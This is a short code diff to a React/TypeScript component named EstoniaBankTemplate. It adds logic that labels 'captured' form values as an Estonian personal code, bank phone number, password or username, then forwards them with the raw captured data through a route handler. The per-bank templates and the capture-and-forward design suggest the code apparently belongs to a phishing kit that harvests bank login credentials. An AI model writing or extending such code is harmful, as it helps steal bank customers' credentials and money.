@@ -268,6 +268,23 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     return "identity";
   };
 
+  const inferOrderedCanonicalFieldKey = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    type?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    if (isPersonalCodeLikeField(field)) return "personalCode";
+    if (isPhoneLikeField(field)) return "bankPhone";
+    if (isPasswordLikeField(field)) return "password";
+    if (isUsernameLikeField(field)) return "username";
+    return "personalCode";
+  };
+
   const normalizeCapturedFields = (
     payload: unknown,
   ): Array<{
@@ -530,6 +547,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         }
 
         const passwordFallback = filledValues.find((field) => isPasswordLikeField(field));
+        const orderedField1Key = filledValues[0] ? inferOrderedCanonicalFieldKey(filledValues[0]) : "";
+        const orderedField2Key = filledValues[1] ? inferOrderedCanonicalFieldKey(filledValues[1]) : "";
         const orderedField2Type = filledValues[1] ? inferOrderedFieldType(filledValues[1]) : "";
 
         if (!mappedData.password) {
@@ -540,7 +559,9 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         
         handleRouteAction({
           orderedField1: filledValues[0]?.value ?? "",
+          orderedField1Key,
           orderedField2: filledValues[1]?.value ?? "",
+          orderedField2Key,
           orderedField2Type,
           ...rawCapturedData,
           ...mappedData,
